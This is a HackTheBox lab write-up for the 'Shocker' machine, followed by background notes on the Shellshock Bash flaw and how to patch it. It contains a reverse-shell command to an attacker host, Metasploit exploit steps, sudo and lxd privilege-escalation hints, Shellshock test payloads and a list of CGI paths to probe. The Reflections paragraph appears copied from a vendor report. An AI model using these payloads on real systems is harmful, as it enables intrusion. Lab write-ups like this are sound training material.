---
title: "HackTheBox Notes: Shocker"
slug: ei96cl
translationKey: ei96cl
date: 2020-07-05T00:45:31+08:00
source: yuque/penetration
---

# Entry point
## nmap
```powershell
$ nmap -p- -sC -sV  -Pn 10.10.10.56 -oA allport
Nmap scan report for 10.10.10.56
Host is up (0.0037s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Used hydra to brute-force SSH with fastrack.txt; nothing to gain.

## /cgi-bin/
Using `binwalk` and `file`, got nothing special

![](https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594136861077-edc920b1-b5c0-477b-b5a9-71441f8930ed.jpeg)

dir searching

```markdown
python3 dirsearch.py -u http://10.10.10.56/ -e * 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions:  | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6564 | Request count: 6564

Error Log: /opt/dirsearch/logs/errors-20-07-07_23-26-11.log

Target: http://10.10.10.56/

Output File: /opt/dirsearch/reports/10.10.10.56/20-07-07_23-26-16

[23:26:16] Starting: 
[23:28:27] 403 -  299B  - /.htaccess-dev
[23:28:27] 403 -  301B  - /.htaccess-local
[23:28:27] 403 -  301B  - /.htaccess-marco
[23:28:28] 403 -  298B  - /.htaccessBAK
[23:28:28] 403 -  299B  - /.htaccess.txt
[23:28:28] 403 -  302B  - /.htaccess.sample
[23:28:28] 403 -  299B  - /.htaccess.old
[23:28:28] 403 -  300B  - /.htaccess.orig
[23:28:28] 403 -  300B  - /.htaccess.save
[23:28:28] 403 -  300B  - /.htaccess.bak1
[23:28:28] 403 -  298B  - /.htaccessOLD
[23:28:28] 403 -  299B  - /.htaccessOLD2
[23:28:28] 403 -  299B  - /.htpasswd-old
[23:28:28] 403 -  297B  - /.httr-oauth
[23:34:58] 403 -  294B  - /cgi-bin/

```

after obtaining these, no progress.

## OSINT
while searching for  "**shocker cgi-bin**", finding a open-source project named _shocker, see_[ https://github.com/nccgroup/shocker](https://github.com/nccgroup/shocker)

add the ext of "**.sh, .cgi**" in dirbuster, 

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594136843939-1432239f-560b-43ec-8d61-aa0de544520c.png)

also, `dirb [http://10.10.10.56/cgi-bin](http://10.10.10.56/cgi-bin) -X .cgi,.sh,.php,.py,.pl` is supported.

## /cgi/bin/user.sh
```markdown
Content-Type: text/plain

Just an uptime test script

 11:46:01 up  1:16,  0 users,  load average: 0.00, 0.00, 0.00


```

the exp of **RCE** can be used at least in 2 ways

1st is the _shock_ scirpt

```markdown
./shocker.py -H 10.10.10.56 -c '/cgi-bin/user.sh'
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594137744360-0f8d0978-12e1-4092-b203-28358242f5be.png)

```markdown
# rce on shocker 
$ /bin/bash -i >& /dev/tcp/10.10.16.122/1337 0>&1
 No response
 
# get reverse shell
$ nc -lvp 1337 
listening on [any] 1337 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.16.122] from (UNKNOWN) [10.10.10.56] 55964
bash: no job control in this shell

shelly@Shocker:/usr/lib/cgi-bin$ ls
	user.sh

shelly@Shocker:/usr/lib/cgi-bin$ id
  id
  uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

```

the 2nd is **msf**

```markdown
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost tun0 
	lhost => tun0
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 10.10.10.56
	rhosts => 10.10.10.56
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/user.sh
	targeturi => /cgi-bin/user.sh
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.16.122:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (980808 bytes) to 10.10.10.56

```

# priv esc
## sudo perl
```markdown
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
  sudo -l
  Matching Defaults entries for shelly on Shocker:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User shelly may run the following commands on Shocker:
      (root) NOPASSWD: /usr/bin/perl

```

## priv esc via lxd
```markdown
$ cat /etc/passwd
...
	lxd:x:106:65534::/var/lib/lxd/:/bin/false
...

$ id
uid=1000(shelly) ... 110(lxd) ...
```



# Note on ShellShock
![](https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594266649245-d88435b8-f042-4550-86fa-f91203014705.jpeg)

> GNU Bash 4.3 and earlier versions contain a security vulnerability when evaluating certain specially crafted environment variables: appending extra strings after a function definition inside an environment variable value triggers the flaw. An attacker can exploit this vulnerability to change or bypass environment restrictions to execute shell commands. Some services and applications allow unauthenticated remote attackers to supply environment variables to exploit this vulnerability. The flaw exists because environment variables can be created with crafted values before the Bash shell is invoked. These variables can contain code that is executed immediately after the shell is called.
>
> The following points are especially noteworthy:
>
> + The English name of this vulnerability is Shellshock; in Chinese, XCERT named it the "broken shell" ("Poke") vulnerability.
> + Per the CVSS score, the severity of Shellshock is rated 10 (the maximum) — the OpenSSL "Heartbleed" vulnerability that erupted this April was only a 5!
> + The Shellshock vulnerability has existed for 25 years, as old as Bash itself.
>
> GNU Bash <= 4.3, this vulnerability may affect

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594266142774-e2a59a54-e481-4409-a882-d215069aceb9.png)

1. For HTTP headers, the CGI script interpreter treats them as environment variables and sets them into temporary environment variables by invoking Bash's env-related functions;
2. The HTTP protocol allows clients to send arbitrary custom HTTP headers;
3. This creates a complete scenario for Bash command injection: the client deliberately sends crafted HTTP headers carrying attack commands to the server; the server calls the function that sets environment variables and directly executes the commands contained in the client-supplied headers, and even returns the results back to the client.

## How It Works
The principle of Shellshock is the exploitation of a flaw in how Bash imports environment variable functions: when Bash starts, it not only imports the function but also executes the commands that follow the function definition. In the design of some CGI scripts, data is passed through environment variables, which gives data providers an opportunity to exploit the Shellshock vulnerability.

The environment variables used by current versions of bash are invoked via function names. The problem arises because an environment variable whose definition starts with "`(){`" gets parsed into a function within the ENV command, after which Bash does not exit but continues to parse and execute shell commands. The core cause is that input filtering does not strictly enforce boundaries and performs no legal parameter validation.

When an Apache server runs scripts using `mod_cgi` (not `mod_php` or `mod_python`), data is passed via environment variables — one of the oldest techniques in the Internet world.

## Testing
The following commands can be used to check whether a system is vulnerable (run in your local Bash environment):

**Shellshock 1, CVE-2014-6271**, test method:

`env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`

If the output is as follows, the system is vulnerable: `vulnerable, this is a test`

---

**Shellshock 2, CVE-2014-7169**, test method:

` env -i  X='() { (a)=>\' bash -c 'echo date'; cat echo`

If the output is as follows, the vulnerability is still present:

` bash: X: line 1: syntax error near unexpected token ='bash: X: line 1: 'bash: error importing function definition for `X'Wed Sep 24 14:12:49 PDT 2014`

...

## Fuzzing List
According to ZoomEye's fuzzing probes, the fuzzing list is as follows:

```markdown
/cgi-bin/load.cgi
/cgi-bin/gsweb.cgi
/cgi-bin/redirector.cgi
/cgi-bin/test.cgi
/cgi-bin/index.cgi
/cgi-bin/help.cgi
/cgi-bin/about.cgi
/cgi-bin/vidredirect.cgi
/cgi-bin/click.cgi
/cgi-bin/details.cgi
/cgi-bin/log.cgi
/cgi-bin/viewcontent.cgi
/cgi-bin/content.cgi
/cgi-bin/admin.cgi
/cgi-bin/webmail.cgi
```

## Remediation Recommendations
You can now upgrade and patch Bash in the following ways:

| Operating System | Upgrade Method |
| --- | --- |
| Ubuntu/Debian | apt-get update   apt-get install bash |
| RedHat/CentOS/Fedora | yum update -y bash |
| Arch Linux | pacman -Syu |
| OS X | brew update   brew install bash   sudo sh -c 'echo "/usr/local/bin/bash" >> /etc/shells'   chsh -s /usr/local/bin/bash   sudo mv /bin/bash /bin/bash-backup   sudo ln -s /usr/local/bin/bash /bin/bash |
| MacPorts | sudo port self update   sudo port upgrade bash |



After upgrading, it is recommended to run the diagnostic methods above to verify the patch is complete.



## Reflections
Threats always arrive when people least expect them — sometimes an unintended avalanche, sometimes deliberate scheming. "Viruses do not rest on Sundays" is a saying that must be passed on during onboarding for every new Antiy employee; we heard it from Bai Song, and we in turn have passed it on to Antiy newcomers. A threat may catch us off guard in an instant, but no threat can evade our perception and analysis for long.

We dedicate our work to our families, our comrades-in-arms, and our motherland

# reference
+ [https://www.anquanke.com/post/id/179407](https://www.anquanke.com/post/id/179407)
+ [https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd](https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd)
+ [Shocker](https://www.jianshu.com/p/66f74282a299)
+ [ nccgroup / shocker ](https://github.com/nccgroup/shocker)
+ [https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/](https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/)
+ [https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/](https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/)
+ [https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt](https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt)
+ [https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html](https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html)
+ [https://blog.csdn.net/weixin_33709219/article/details/87981615](https://blog.csdn.net/weixin_33709219/article/details/87981615)
+ [https://www.antiy.com/response/CVE-2014-6271.html](https://www.antiy.com/response/CVE-2014-6271.html)
+ [https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html](https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html)
